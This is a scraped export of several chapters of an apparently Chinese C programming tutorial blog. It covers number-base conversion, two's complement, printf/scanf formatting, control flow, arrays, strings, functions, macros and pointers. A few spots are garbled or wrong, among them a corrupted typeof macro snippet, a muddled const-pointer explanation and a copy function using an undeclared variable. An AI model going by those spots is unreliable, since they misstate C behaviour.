1.2; // 显示转换一个float为int int sum = (int) x + 1; printf(\u0026quot;sum = %d\u0026quot;, sum); return 0; } 进制转换 十进制 十进制转二进制： 除2反向取余法\n十进制转八进制：除8反向取余法\n十进制转十六进制：除16反向取余法\n例如：16进制转10进制\n将十进制数除以 16。将除法视为整数除法 写下余数（十六进制） 将结果再次除以 16。将除法视为整数除法 重复步骤 2 和 3，直到结果为 0 求出的十六进制值是从最后到第一个的余数的数字序列 427的16进制\n将数字除以 16，余数（小数部分乘16为余数），最终为1AB\n八进制 8进制转10进制：从后向前，8的0次方，8的1次方，8的2次方\u0026hellip;按照该顺序乘8的\n8进制75转10进制为：$56+5=61$ 8进制77655转10进制为：$7(8^4)+7(8^3)+6(8^2)+5(8^1)+5(8^0)=28672+3584+384+40+5=32685$ 2进制转8进制：自右向左，每3位一组，按421码转换。高位不足三位补0\n1 010 111 010 110 二进制转八进制如下表，最后算出结果为12726\n4 2 1 0 0 1 0 1 0 1 1 1 0 1 0 1 1 0 十六进制 16进制转10进制：从后向前依次展开，16的0次方，16的1次方，16的2次方\u0026hellip;，每位相加，例如：\n0x1A = $16 + 10 = 26$ 15DE = $1(16^3)+5(16^2)+13(16^1)+14= 4096+1280+208+14=5598$ 16进制转二进制：4位一组一次填充。例如 0X1A的二进制，即00011010如下\n8 4 2 1 1 0 1 0 0 0 0 1 二进制转16进制：自右向左，每4位一组，按8421码转换。高位不足三位补0\n例如 0001 0011 1111的16进制为，如下表 1 3 F(15)\n8 4 2 1 0 0 0 1 0 0 1 1 1 1 1 1 源码反码补码 源码 (*** true form****), 反码 (1‘s complement) [7], 补码 (2‘s complement) [8] 是操作系统中存储和计算数据的一种方式\n任何数据都以二进制机器码存储与计算机中。对于的机器码，第一位是用来表示正负值的：0是正数，1是负数。故要表示 -2，对应的机器码是 10000010。\n机器码不可以直接通过权重展开计算，例如 10000010 为 $1(2^7) + 1(2^1) = 130$ 。因为第一位是1，所以是负数，接下来计算后一位的权重展开为 $-2$\n原码：机器码表示的值成为源码：如 43 = 00101011，-43 = 10101011\n反码：符号位不变，其余位取反：如 43 = 00101011，-43 = 11010100\n补码：符号位不变，counter code then LSB (least significant bit) + 1：如 43 = 00101011，-43 = 11010101\n128 64 32 16 8 4 2 1 0 0 1 0 1 0 1 1 1 1 0 1 0 1 0 0+1(如果需要进位则进一位) 1 1 0 1 0 1 0 1 Note：二进制 10000000 为 -128\n反码, 补码 是为了计算和存储正负数诞生的，正如 C语言的数据结构 中 有符号和没符号表示的数值位置不一样。\nReference [1] keywords c language\n[2] Arithmetic Operators\n[3] four stages of compilation c\n[4] offline installation visual studio\n[5] difference float double\n[6] data type in c\n[7] 1‘s complement\n[8] 2‘s complement\n","permalink":"https://www.oomkill.com/2022/09/ch01-parmeter-and-data-structrue/","summary":"","title":"ch01 变量和数据类型"},{"content":"格式化 printf printf() 用于打印消息以及变量的值。\n#include\u0026lt;stdio.h\u0026gt; int main() { int a = 24; printf(\u0026quot;Welcome! \\n\u0026quot;); printf(\u0026quot;The value of a : %d\u0026quot;,a); getchar(); return 0; } sprintf sprintf() 不打印字符串，是将字符值和格式化结构一并存储在一个数组中。\nint main() { char buffer[50]; int a = 10, b = 20, c; c = a + b; sprintf(buffer, \u0026quot;Sum of %d and %d is %d\u0026quot;, a, b, c); // The string \u0026quot;sum of 10 and 20 is 30\u0026quot; is stored // into buffer instead of printing on stdout printf(\u0026quot;%s\u0026quot;, buffer); return 0; } scanf 从标准输入读取用户输入的\ntype Argument \u0026amp; Description ***** 读取标准输入用户输入的值，但不存储在对应接受的变量中 width 这个操作中读取的最大字符 type 指定要读取的数据类型以及预期如何读取数据 修饰符类型\n类型 标识符 int %d char %c float %f double %lf short int %hd unsigned int %u long int %li long long int %lli unsigned long int %lu unsigned long long int %llu signed char %c unsigned char %c long double %Lf 格式化\nDescription Code Result 接受字符类型保存在数组中 scanf(\u0026quot;%19c\u0026quot;, \u0026amp;a); \u0026lsquo;1234567890abcfefg\u0026rsquo; 整型类型 scanf(\u0026quot;%d\u0026quot;, \u0026amp;testInteger); \u0026lsquo;10\u0026rsquo; 多个接收值 scanf(\u0026quot;%d%f\u0026quot;, \u0026amp;a, \u0026amp;b); scanf的缺点\n如果存储空间不足，数据能存储到内存中，但不被保护。 scanf 函数接收字符串时， 碰到 空格 和 换行 会自动终止。不能使用 scanf 的 %s 接收带有空格的字符串。 格式化标记符 [1] 标记符 标记符 %i / %d int %c char %f float %s string %u unsigned decimal %o octal %x hexadecimal 对字符串填充 在 % 符号后添加一个零 (0)，可以对 printf 整数输出进行零填充\nCode Result printf(\u0026quot;%03d\u0026quot;, 0); 000 printf(\u0026quot;%03d\u0026quot;, 1); 001 printf(\u0026quot;%03d\u0026quot;, 123456789); 123456789 printf(\u0026quot;%03d\u0026quot;, -10); -10 printf(\u0026quot;%03d\u0026quot;, -123456789); -123456789 对于此类格式化方式总结有如下几种模式\nDescription Code Result 填充5位（默认以空白填充，左对齐填充） printf(\u0026quot;\u0026rsquo;%5d\u0026rsquo;\u0026quot;, 10); \u0026rsquo; 10' 填充5位（右对齐填充） printf(\u0026quot;\u0026rsquo;%-5d\u0026rsquo;\u0026quot;, 10); \u0026lsquo;10 ' 填充5位“0”（默认左对齐填充） printf(\u0026quot;\u0026rsquo;%05d\u0026rsquo;\u0026quot;, 10); \u0026lsquo;00010\u0026rsquo; 有符号的表示的数字（默认左对齐填充） printf(\u0026quot;\u0026rsquo;%+5d\u0026rsquo;\u0026quot;, 10); \u0026rsquo; +10\u0026rsquo; 有符号的表示的数字，右对齐填充空白 printf(\u0026quot;\u0026rsquo;%-+5d\u0026rsquo;\u0026quot;, 10); \u0026lsquo;+10 ' 浮点数格式化 Description Code Result 保留1位小数 printf(\u0026quot;\u0026rsquo;%.1f\u0026rsquo;\u0026quot;, 10.3456); \u0026lsquo;10.3\u0026rsquo; 保留2位小数 printf(\u0026quot;\u0026rsquo;%.2f\u0026rsquo;\u0026quot;, 10.3456); \u0026lsquo;10.35\u0026rsquo; 整数位最少8位宽度，小数位2位 printf(\u0026quot;\u0026rsquo;%8.2f\u0026rsquo;\u0026quot;, 10.3456); \u0026rsquo; 10.35\u0026rsquo; 整数位最少8位宽度，小数位4位 printf(\u0026quot;\u0026rsquo;%8.4f\u0026rsquo;\u0026quot;, 10.3456); \u0026rsquo; 10.3456' 整数位最少8位，小数位2位，不足8位将用0填充（默认左对齐填充） printf(\u0026quot;\u0026rsquo;%08.2f\u0026rsquo;\u0026quot;, 10.3456); \u0026lsquo;00010.35\u0026rsquo; 整数位最少8位，小数位2位，不足8位将用空白右对齐填充 printf(\u0026quot;\u0026rsquo;%-8.2f\u0026rsquo;\u0026quot;, 10.3456); \u0026lsquo;10.35 ' 打印更大的浮点数，小数位2位 printf(\u0026quot;\u0026rsquo;%-8.2f\u0026rsquo;\u0026quot;, 101234567.3456); \u0026lsquo;101234567.35\u0026rsquo; 字符串格式化 Description Code Result 字符串输出 printf(\u0026quot;\u0026rsquo;%s\u0026rsquo;\u0026quot;, \u0026ldquo;Hello\u0026rdquo;); \u0026lsquo;Hello\u0026rsquo; 保证输出结果是10位，不足位用空白填充（默认左对齐填充） printf(\u0026quot;\u0026rsquo;%10s\u0026rsquo;\u0026quot;, \u0026ldquo;Hello\u0026rdquo;); \u0026rsquo; Hello\u0026rsquo; 保证输出结果是10位，不足位用空白右对齐填充 printf(\u0026quot;\u0026rsquo;%-10s\u0026rsquo;\u0026quot;, \u0026ldquo;Hello\u0026rdquo;); \u0026lsquo;Hello ' 特殊字符 \\a audible alert \\b backspace（退格） \\f form feed （换页） \\n newline（换行） \\r carriage return（回车） \\t tab \\v vertical tab（垂直制表符） \\ backslash （反斜杠） 运算符 C语言中运算符优先级为下表所示\n优先级 运算符 说明 关联性 1 ++ -- 前缀/后缀 自增/减 从左向右 () 函数调用 [] 数组下标 (subscripting) . 结构体成员访问 -\u0026gt; 指针结构体成员访问 2 ++ -- 前缀/后缀 自增/减 从右向左 + - (Unary) 一元 +/-（正负号） ! ~ 逻辑非与按位非 (type) 转换 * 取消引用 \u0026amp; 地址符 sizeof Size-of 3 * / % Multiplication, division, remainder 从左向右 4 + - Addition and subtraction 5 \u0026lt;\u0026lt; \u0026gt;\u0026gt; Bitwise left shift and right shift 6 \u0026lt; \u0026lt;= \u0026gt; \u0026gt;= == != 关系运算符 \u0026lt; , ≤ , \u0026gt; , ≥ ,= , ≠ 7 \u0026amp; 按位与 8 ^ 按位异或 9 ` ` 按位异或 10 \u0026amp;\u0026amp; 逻辑与 11 ` ` 12 ?: 三元运算(Ternary conditional) 从右向左 13 = 赋值 += -= 按和差赋值 *= /= %= 按乘积，商，余赋值 \u0026lt;\u0026lt;= \u0026gt;\u0026gt;= 按左，右位移赋值 \u0026amp;= ^= ` =` 按位 与或非赋值 14 , 逗号 从左向右 流程控制 [2] C语言中提供了两种流程控制(flow control)\nBranching Looping Branching 分支 (Branching) 将决定采取什么动作，循环将决定采取某种行动的次数。\nif 形态1：\nif (expression) statement; if (expression) { Block of statements; } 形态2:\nif (expression) { Block of statements; } else { Block of statements; } 形态3：\nif (expression) { Block of statements; } else if(expression) { Block of statements; } else { Block of statements; } 三元运算 \u0026lt;value1\u0026gt; ? \u0026lt;value2\u0026gt; : \u0026lt;value3\u0026gt; 是三元运算符，因为它需要三个值，这是 C 中唯一的三元运算符。语法\nif condition is true ? then X return value : otherwise Y value; switch switch( expression ) { case constant-expression1:\tstatements1; [case constant-expression2:\tstatements2;] [case constant-expression3:\tstatements3;] [default : statements4;] } break 关键字用作退出 switch 语句。在 switch case 中满足条件，则执行继续到下一个 case 子句，如果没有明确指定执行应该退出 switch 语句。\ndefault 关键字用于在所有case中都不满足条件，则执行default\ncase穿透：case分支中如果,没有 break；那么它会向下继续执行下一个case分支.\nif VS switch 检查表达式：if-else 可以基于值或条件检查表达式，而 switch 语句仅基于字符表达式或整数类型检查表达式。 运行速度：在大量条件检查中进行选择，switch 语句的运行速度将比使用 if-else 的逻辑快得多。 适合条件不同：if-else 适合导致布尔值的可变条件，而 switch 适合固定值。 可读性：if-else较switch-case语句可读性较差 Looping 循环 (Looping) 提供了一种重复命令和控制重复次数的方法。\nwhile while 是 c 语言中最基础的循环，while将检查expression，直到expression为false将推出循环\nwhile ( expression ) { Single statement or Block of statements; } for for是类似与while的循环，只是语法上不同，for提供了三个表达式\nfor( expression1; expression2; expression3) { Single statement or Block of statements; } expression1 - 通常用于初始化变量（在此初始化的变量作用域仅为该循环中） expression2 - 条件表达式，只要该表达式为true则循环将一直被执行 expression3 - 修饰符，通常用于变量的自增自减操作 三个表达式都可以为空，这种场景下循环将一直进行 do\u0026hellip;while 类似与while ，只不过do..while循环，在循环结束开始检查测试条件。这意味着循环的内容将==至少执行一次==。\ndo { Single statement or Block of statements; } while(expression); break VS continue C语言提供了两个命令来控制循环：\nbreak，退出循环或switch continue，跳过当前迭代 (iteration)，继续循环 #include main() { int i; int j = 10; for( i = 0; i \u0026lt;= j; i ++ ) { if( i == 5 ) { continue; } printf(\u0026quot;Hello %d\\n\u0026quot;, i ); } } 输出结果将没有第五次迭代\nHello 0 Hello 1 Hello 2 Hello 3 Hello 4 Hello 6 Hello 7 Hello 8 Hello 9 Hello 10 goto goto 声明在C语言中提供了了一个无条件跳转到goto label出的\ngoto label; .. . label: statement; 下面例子中，将从10开始执行，跳过15继续从16开始到20结束。\n#include \u0026lt;stdio.h\u0026gt; int main () { /* 局部变量定义 */ int a = 10; /* do循环体 */ LOOP:do { if( a == 15) { /* 跳出迭代 */ a = a + 1; goto LOOP; } printf(\u0026quot;value of a: %d\\n\u0026quot;, a); a++; }while( a \u0026lt; 20 ); return 0; } Reference [1] printf format\n[2] control_statements\n","permalink":"https://www.oomkill.com/2022/09/ch02-control-statements-and-format/","summary":"","title":"ch02 格式化与流程控制"},{"content":"Array [1] 数组是由单个元素组成的一组数据类型的变量 数组的元素存储在连续的内存位置 声明数组时应提及数组的大小 数组的计数从0开始 数组为一位数组与多维数组 数组首元素的地址与数组地址相同 数组包含 int, float, char, double 数据类型 Declaration and Initialization 表达式 说明 int my_array1[20]; 指定大小，来声明一个有20个元素的int数组 char my_array2[5]; 指定大小，来声明一个有5个元素的char数组 int my_array[] = {100, 200, 300, 400, 500} 声明时初始化一个数组（编译器自动求数组元素个数） int my_array1[5] = {100, 200, 300, 400, 500}; 声明时初始化 int my_array2[5] = {100, 200, 300}; 声明时初始化（剩余未初始化的元素，默认 0 值） int my_array2[5] = {0}; 声明时初始化（声明一个全0值的数组） int arr[10]; arr[0] = 5;arr[1] = 6;arr[2] = 7; 声明数组并初始化值（这种方法为初始化部分的默认值为随机数） char str[] = \u0026ldquo;zhangsan\u0026rdquo; 声明一个字符串（字符串是一个char类型数组） Advantages and Disadvantages 缺点**：大小限制**：声明（定义）后是固定的大小，不能通过运行时改变其大小\n优点：\n代码优化，可以通过数组更好的对数据进行检索或排序 随机存储，可以将数据存储在不同的位置 muitl-dimensional [5] 数组中的数组，又称为多维数组(*** multidimensional arrays***)。包含 2D 3D数组。2D是包含行(rows), 列(columns) 的数组；而3D数组是在2D的基础上，增加了一个维度。包含如下：\n第一个维度：大小 第二个维度：二维数组的行 第三个维度：二维数组的列 而更高维度的数组，实际上就是在3D, 4D\u0026hellip; 上再增加一个维度。\ndeclare 声明一个多维数组方式如下，声明一个二维数组\nfloat x[3][4]; Initialization 初始化方式 说明 代码 常规初始化 int arr[3][5] = { {2, 3, 54, 56, 7 }, {2, 67, 4, 35, 9}, {1, 4, 16, 3, 78}}; 不完全初始化 未被初始化的数值为 0 int arr[3][5] = { {2, 3}, {2, 67, 4, }, {1, 4, 16, 78}}; 初始化一个 初值全为0的二维数组 int arr[3][5] = {0}; 系统自动分配行列 int arr[3][5] = {2, 3, 2, 67, 4, 1, 4, 16, 78}; 不完全指定行列初始化 二维数组定义必须指定列值 int arr[][] = {1, 3, 4, 6, 7};（==错误示例==） 二维数组定义可以不指定行值 int arr[][2] = { 1, 3, 4, 6, 7 }; 示例：遍历一个二维数组\n#include \u0026lt;math.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; void main() { int row,colume; int arr[][2] = {1, 3, 4, 6, 7, 10}; row = sizeof(arr)/ sizeof(arr[0]); colume = sizeof(arr[0])/ sizeof(arr[0][0]); for(int i=0;i\u0026lt;row;i++) { for(int j=0;j\u0026lt;colume;j++) { printf(\u0026quot;%d \u0026quot;, arr[i][j]); } printf(\u0026quot;\\n\u0026quot;); } } 声明和便利一个三维数组\n#include \u0026lt;stdio.h\u0026gt; void main() { int i, j, k; int arr[3][3][3]= { { {11, 12, 13}, {14, 15, 16}, {17, 18, 19} }, { {21, 22, 23}, {24, 25, 26}, {27, 28, 29} }, { {31, 32, 33}, {34, 35, 36}, {37, 38, 39} }, }; printf(\u0026quot;:::3D Array Elements:::\\n\u0026quot;); for(i=0;i\u0026lt;3;i++) { for(j=0;j\u0026lt;3;j++) { for(k=0;k\u0026lt;3;k++) { printf(\u0026quot;%d\\t\u0026quot;,arr[i][j][k]); } printf(\u0026quot;\\n\u0026quot;); } printf(\u0026quot;\\n\u0026quot;); } } String [3] 字符串 (string) 是一组字符 (char)，以 ”\\0“ 结尾，抽象来说，C语言中字符串就是数组类型的char\n定义，定义一个值为”colour“的字符串。\nchar message[6] = {'C', 'o', 'l', 'o', 'u', 'r', '\\0'}; 而 \u0026ldquo;\\0\u0026rdquo; 可以省略，定义可以如下\nchar message[]= “Colour”; C语言初始化字符串的4中方法\n表达式 说明 char str[] = \u0026ldquo;hello world\u0026rdquo;; 分配不带大小的字符串 char str[50] = \u0026ldquo;hello world\u0026rdquo;; 分配具有预定义大小的字符串 char str[14] = { \u0026lsquo;h\u0026rsquo;,\u0026rsquo;e\u0026rsquo;,\u0026rsquo;l\u0026rsquo;,\u0026rsquo;l\u0026rsquo;,\u0026lsquo;o\u0026rsquo;,\u0026rsquo;\\0\u0026rsquo;}; 按字符分配大小的字符串 char str[] = { \u0026lsquo;h\u0026rsquo;,\u0026rsquo;e\u0026rsquo;,\u0026rsquo;l\u0026rsquo;,\u0026rsquo;l\u0026rsquo;,\u0026lsquo;o\u0026rsquo;,\u0026rsquo;\\0\u0026rsquo;}; 不带大小的按字符分配大小的字符串 在C语言中，数组和字符串都是二等公民，一旦声明后，不支持赋值运算符\n#include\u0026lt;stdio.h\u0026gt; int main() { char message[6] = {'C', 'o', 'l', 'o', 'u', 'r'}; message = \u0026quot;aaaaaa\u0026quot;; printf(\u0026quot;sum = %c\\n\u0026quot;, message); return 0; } 上面代码对字符串二次赋值，这种编译器直接报错\n1.c: In function 'main': 1.c:6:13: error: assignment to expression with array type message = \u0026quot;aaaaaa\u0026quot;; Notes：复制字符串可以使用函数 strcpy()\n字符串获取 scanf：\n存储字符串的空间必须足够大，防止溢出。\n获取字符串，%s， 遇到 空格 和 \\n 终止。\n使用“正则表达式”可以获取带有空格的字符串，如：scanf(\u0026quot;%[^\\n]\u0026quot;, str);\ngets：类似与 scanf ；从stdin中读取字符串保存在变量中，遇到换行符终止（可以获取带有“空格”的字符串）。\n参数：用来存储字符串的空间地址 返回值：返回实际获取到的字符串首地址。 fgets：从指定流读取一行字符串，遇到换行符或到达结尾终止\n*str：存储读取字符串的变量指针。 n：读取的最大字符 *stream：输入流的对象指针，如stdin 字符串写入 puts：将一行字符串写入输出流 (stdout)， 输出字符串后会自动添加 \\n 换行符。\nchar* str：被打印的字符串\nreturn value：成功返回非0的integer，失败返回 EOF\nfputs：将字符串写入指定流，不包含换行符 \\n\nconst char *str：写入的以NULL字符结尾的字符串 FILE *stream： FILE 对象的指针，代表要将字符串写入的流 return value：成功返回非0的integer，失败返回 EOF Array VS String [2] 数据类型不同：数组可以保存 int, float, doubles类型，字符串只能保存char类型 长度不同：数组长度是固定的，字符串长度可变（通过指针） 数据结构不同：数组可以是一维或多维，字符串是一维数组，结束是一个空字符 ”\\0\u0026quot; char * VS char [] char a[10] char *a a是一个数组 a是一个指针 sizeof为数组的大小 sizeof为指针类型的大小 存储在内存中的栈段 a的地址被存储在栈中，但是内容被存储在.rodata中 a不可以被修改 a可以被修改 a[0]可以被修改 a[0]不可以被修改，因为内容在.rodata char *a=\u0026ldquo;text\u0026rdquo;; *a 存储的 text 内容，只读区内容不能修改 a 代表存储的 .rodata的地址 a=\u0026ldquo;text1\u0026rdquo; text1位于内存中其他地方的，将这个地址赋值给a 字符串的拷贝 使用指针运算方式\nvoid copy_string02(char* dest, char* src){ while (*source != '\\0' /* *src != 0 */){ *dest = *src; src++; dest++; } } 使用数组方式\nvoid copy_string01(char* dest, char* src ){ for (int i = 0; src[i] != '\\0';i++){ dest[i] = src[i]; } } 使用while循环\nvoid copy_string03(char* dest, char* source){ // 判断时赋值结尾 0=0也会退出循环 while (*dest++ = *source++){} } 字符串的格式化 用于将字符串打印在标准输出的：int printf(const char* str, ...); 用于将字符串格式化打印在缓冲区中的（stdin, stdout, stderr是隐式缓冲资源）：int fprintf(FILE *fptr, const char *str, ...); 用于格式化而不打印的：int sprintf(char *str, const char *string,...); array sorting 杯子交换 三杯水交换算法 ( The Cup Swapping algorithm)\n有两杯装满水的杯子来代表变量的值，如果需要交换两杯水到对方，就如同交换两个变量的值，此时需要第三个杯子来交换液体，就像第三个变量用作临时存储变量的值一样。\n例如，数组的倒序可以使用该方法，也是其他算法中的基础。\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; int main() { int arr[] = {22,321,56,1,66,23,9,10}; // 数组的长度 int len = sizeof(arr) / sizeof(arr[0]); // 临时变量 int tmp;\t// 交换 数组元素，做逆序 for (int i=0;i\u0026lt;len;i++) { if (i \u0026gt; len/2) { break; } tmp = arr[i]; // 第三杯水 arr[i] = arr[len-i-1]; arr[len-i-1] = tmp; } } 冒泡 [4] 冒泡排序 (bubble sort) 是最简单的排序算法，其核心是==如果两个相邻元素的位置排序不对，就交换相邻的元素==，例如： arr[] = {5, 1, 4, 2, 8} ，从前两个元素开始比较检查哪个更大\n第一轮（迭代）：\n( 5 1 4 2 8 ) -\u0026gt; ( 1 5 4 2 8 )，比较前两个元素 5 \u0026gt; 1 交换两个位置。\n( 1 5 4 2 8 ) –\u0026gt; ( 1 4 5 2 8 )，5 \u0026gt; 4 交换两个位置\n( 1 4 5 2 8 ) –\u0026gt; ( 1 4 2 5 8 )，5 \u0026gt; 2 交换两个位置\n( 1 4 2 5 8 ) -\u0026gt; ( 1 4 2 5 8 )，(8 \u0026gt; 5)，不会交换，至此最后一位排序正确\n第二轮\n( 1 4 2 5 8 ) -\u0026gt; ( 1 4 2 5 8 ) ( 1 4 2 5 8 ) –\u0026gt; ( 1 2 4 5 8 )，4 \u0026gt; 2 交换两个位置 ( 1 2 4 5 8 ) -\u0026gt; ( 1 2 4 5 8 ) ( 1 2 4 5 8 ) -\u0026gt; ( 1 2 4 5 8 ) 第三轮（没法发生交换）\n( 1 2 4 5 8 ) -\u0026gt; ( 1 2 4 5 8 ) ( 1 2 4 5 8 ) -\u0026gt; ( 1 2 4 5 8 ) ( 1 2 4 5 8 ) -\u0026gt; ( 1 2 4 5 8 ) ( 1 2 4 5 8 ) -\u0026gt; ( 1 2 4 5 8 ) 算法实现\n#include \u0026lt;stdio.h\u0026gt; // 三杯水交换 void swap(int* x, int* y) { int temp = *x; *x = *y; *y = temp; } // 冒泡实现 void bubbleSort(int arr[], int n) { int i, j; for (i = 0; i \u0026lt; n - 1; i++) // Last i elements are already in place for (j = 0; j \u0026lt; n - i - 1; j++) if (arr[j] \u0026gt; arr[j + 1]) swap(\u0026amp;arr[j], \u0026amp;arr[j + 1]); } // 打印数组 void printArray(int arr[], int size) { int i; for (i = 0; i \u0026lt; size; i++) printf(\u0026quot;%d \u0026quot;, arr[i]); printf(\u0026quot;\\n\u0026quot;); } int main() { int arr[] = { 64, 34, 25, 12, 22, 11, 90 }; int n = sizeof(arr) / sizeof(arr[0]); bubbleSort(arr, n); printf(\u0026quot;Sorted array: \\n\u0026quot;); printArray(arr, n); return 0; } 输出结果为\nSorted array: 11 12 22 25 34 64 90 Reference [1] Arrays in c\n[2] difference between array and string\n[3] string in c\n[4] bubble sort with c\n[5] 3d array in c\n","permalink":"https://www.oomkill.com/2022/09/ch03-array/","summary":"","title":"ch03 数组"},{"content":"concept [1] 函数 (function) 是执行任务的语句块。\n函数的作用：\n提高代码的可重用性并减少冗余 代码模块化 代码易读性 使代码模块化 函数的分类 C语言中有两种类型的函数：\n标准库函数：C中的内置函数，在头文件中定义 #include \u0026lt;stdio.h\u0026gt; 用户自定义函数：用户自定义的函数 #include \u0026quot;stdio.h\u0026quot; 函数三部曲 C语言中函数分为三个方面，声明(declaration)，定义(defining)，调用(calling)\n声明 声明是让编译器知道函数的名称、参数信息、参数的返回值的类型。\n(type) function_name({type args...}); 隐式声明(implicit) ：当在main之后定义的函数而未声明，默认编译器会做隐式声明。\nISO/IEC 9899:1990 中 关于函数声明的部分：\n函数在调用前必须有一个可用的声明，如果没有被声明，则该函数默认被隐式声明，该隐式声明没有参数，返回值为int [2]\n定义 C中函数定义的语法如下\nreturn_type function_name(arg1, arg2, ... argn) { function body // 函数中要处理任务的逻辑 } return_type：函数返回值的数据类型 function_name：函数名 arg1, arg2, \u0026hellip;argn：参数列表（可选），定义传递给函数的数据类型、顺序和参数的数量。 function body：调用函数时任务处理和执行的语句 调用 调用是指要由编译器执行的函数，可以在任何部分调用\n虚函数void 如果函数没有返回值，则使用关键字 void，主要用于两个方面：\n打印具体信息供用户阅读的函数 引用参数，函数通常不是用于返回一个内容，而是修改引用参数的，无需返回值 void 关键字使用注意：\nvoid仅用于限定函数返回值，函数参数，不可以修饰变量，因为无法对无类型的变量分配指针\nvoid修饰指针时表示泛指针，可以无需强制转换为其他类型的指针\nvoid *ptr=NULL; char * a=\u0026quot;1234\u0026quot;; printf(\u0026quot;a %s\\n\u0026quot;, a); ptr = a; printf(\u0026quot;%s\\n\u0026quot;, (char*)ptr); 宏函数 宏函数是指带有参数的宏(Macro-Arguments)，具有类似函数的功能，例如下列时一个获取最小值的宏函数\n#define min(X, Y) ((X) \u0026lt; (Y) ? (X) : (Y)) char a='a'; char b='b'; char x = min(a, b); // → x = ((a) \u0026lt; (b) ? (a) : (b)); char y = min(1, 2); // → y = ((1) \u0026lt; (2) ? (1) : (2)); printf(\u0026quot;x is %c, y is %c\\n\u0026quot;, x, y); 宏函数危险部分 在上面例子中存在一些不安全部分\n错误嵌套：\n括号优先级：#define ceil_div(x, y) x + y 因为宏函数带有的括号是围绕这个宏函数的，会存在运算符优先级问题，如果用上述宏函数进行输出得到的结果为：ceil_div(2, 3) * 10 = 32 ，因为括号不是表达式的括号\n解决方法：每一个宏函数的参数需要用括号括起来 #define ceil_div(x, y) (x + y) 吞分号：#define NEW_MACRO() ({ int x = 1; int y = 2; x+y; }) 上述宏函数在GCC预处理步骤替换时，通常调用宏函数的部分会加分号 NEW_MACRO(); ，例如下列代码中\nif(1) SKIP_SPACES(); else ... 被替换后为\nif(1) { int x = 1; int y = 2; x+y; }; // 《这里的分号会跳过else else ... 通常情况下使用do\u0026hellip;while替换\n#define NEW_MACRO() do { int x = 1; int y = 2; x+y; } while (0) if(1) do{ int x = 1; int y = 2; x+y; } while(0); else ... 重复替换的副作用：#define min(X, Y) ((X) \u0026lt; (Y) ? (X) : (Y)) 这个宏函数在gcc预处理中如果调用时是 next = min (x + y, foo (z)); 将被重复替换，如下列代码所示：\nnext = ((x + y) \u0026lt; (foo (z)) ? (x + y) : (foo (z))); // 参数Y被替换为两个foo �代表foo被执行两次，这种显然不安全，推荐使用typeof `c efine min(X, Y) \\ typeof (X) x_ = (X); \\ peof (Y) y_ = (Y); \\ _ \u0026lt; y_) ? x_ : y_; }) 直接自引用：是指定义的宏引用自己，例如 #define foo (4 + foo)，为了方式无限扩展为 (4+(4+foo)), (4+(4+(4+foo))) \u0026hellip; 直到内存耗尽，这种情况编译器将不允许 each undeclared identifier is reported only once for each function it appears in\n间接自引用：指a引用b，b引用a，例如下列代码，是不被允许的\n#define x (4 + y) #define y (2 * x) 参数的换行符不被允许\n函数的退出 exit() 是一个终止当前进程的系统调用（无论在代码哪里调用）；非C语言内置功能 return：向调用函数提供退出状态并将控制权返回给调用函数，C语言内置功能 多文件编程 [3] 多文件程序(multi-file) 是指多个含有不同功能的代码文件（ .c 文件模块），编译到一起，生成一个二进制文件。\n通常包含三部分：\n编译：通过编译器编译多个文件程序\n函数原型（声明）：告知编译器如何使用，表现为：\n函数在一个文件中定义，在另一个文件中调用 想对文件中的函数重新排序 函数相互调用，递归 头文件：使多个文件中的函数可以访问定义和声明，通常情况下包含：\n全局变量和全局常量 类，结构体，联合体，枚举等 创建类型名称的 typedef 语句 函数声明 包含其他文件的语句，如math.h 防止头文件重复包含\nwindows\n#pragma once linux\n#ifndef __HEAD_H__ #define __HEAD_H__ .... head file body #endif Reference [1] c function\n[2] Are prototypes required for all functions in C89, C90 or C99?\n[3] multi-file\n[4] Macros\n","permalink":"https://www.oomkill.com/2022/09/ch04-function/","summary":"","title":"ch04 函数"},{"content":"指针 指针声明 [1] 指针/指针变量 (pointer) 是用于存储地址的变量\n使用 \u0026amp; 运算符 来访问变量的地址。例如\n#include \u0026lt;stdio.h\u0026gt; void main() { int a = 100; printf(\u0026quot;%x\u0026quot;, \u0026amp;a); } 输出结果为 16进制的内存地址\n61fe1c 使用地址运算符 * 可以从变量地址中获取变量的值，这个行为被称为间接引用/解引用(indirection/dereferencing)。例如：\n#include \u0026lt;stdio.h\u0026gt; void main() { int a = 100; printf(\u0026quot;%d\u0026quot;, *(\u0026amp;a)); // 也可以写为，因为*与\u0026amp;优先级相同，从右到左的顺序，所以有没有()意思是相同的 printf(\u0026quot;%d\u0026quot;, *\u0026amp;a); } 输出结果为 100\n指针变量 指针变量是指存储一个变量的地址的变量，可以使用符号 * 来修饰变量，定义语法为：\ndataType *pointerVariableName = \u0026amp;variableName; 例如，下面的两个输出结果是相同的地址\n#include \u0026lt;stdio.h\u0026gt; void main() { int a = 100; int *pointer; pointer = \u0026amp;a; printf(\u0026quot;address of a is: %x\\n\u0026quot;,\u0026amp;a); printf(\u0026quot;address of pointer is: %x\\n\u0026quot;,pointer); } address of a is: 61fe14 address of pointer is: 61fe14 Notes：指针可以通过变量修改也可以直接通过地址进行修改，指针变量就是通过地址进行修改\n修饰符说明 修饰符 说明 * 两个用途：\n指针变量的声明\n返回被引用变量的值 \u0026amp; 返回变量地址 使用const修饰指针 [3] 使用关键字 const 修饰的指针变量是不能改变指针变量所指向的地址的变量，通俗来讲即不能被改变值的指针变量\n声明语句\n\u0026lt;type of pointer\u0026gt; *const \u0026lt;name of pointer\u0026gt;; int *const ptr; const位置：const修饰的部分（const所在位置）不可改变\n例如 const int *p; 与 int const *p; 这里修饰的都是 *p 故\n*p （变量地址）不能被改变\np （变量值）可以被改变\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void main() { int a = 10; int b = 20; int const *p; *p = \u0026amp;b; // result assignment of read-only location '*p' p = 30; // result 30 printf(\u0026quot;%d\u0026quot;,p); } int * const p; const在*后p前，这里修饰的都是 p 故\np不可以被修改 *p 可以被修改 const int *const p; 这里 const 修饰 * 和 p，所以两个都不可修改\nNotes：通常情况下常用只有第一种情况\n使用场景：最为参数形参修饰该参数为只读参数，例如 printf\nint printf (const char *__format, ...) 指针的类型 [2] C语言中包含多种指针类型：\n空指针(Null Pointer) 野指针(Wild Pointer) 悬空指针(Dangling pointer) 泛型指针(void Pointer) 一些早期Dos中的概念 近指针(Near)：不能存储大小大于 16 位的地址 远指针(Far)：32 